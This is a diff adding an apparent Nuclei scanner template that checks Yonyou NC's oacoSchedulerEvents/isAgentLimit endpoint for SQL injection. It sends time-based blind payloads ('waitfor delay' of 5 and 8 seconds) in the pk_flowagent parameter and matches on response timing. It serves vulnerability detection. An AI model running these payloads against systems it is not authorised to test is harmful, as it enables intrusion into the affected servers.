@@ -1,0 +1,30 @@
+id: yongyouNC-isAgentLimit-sql-injection
+
+info:
+  name: 用友NC oacoSchedulerEvents/isAgentLimit SQL注入
+  author: HuanXiong
+  severity: high
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5'-- HTTP/1.1 
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and  
+      - type: status
+        status: 
+          - 200
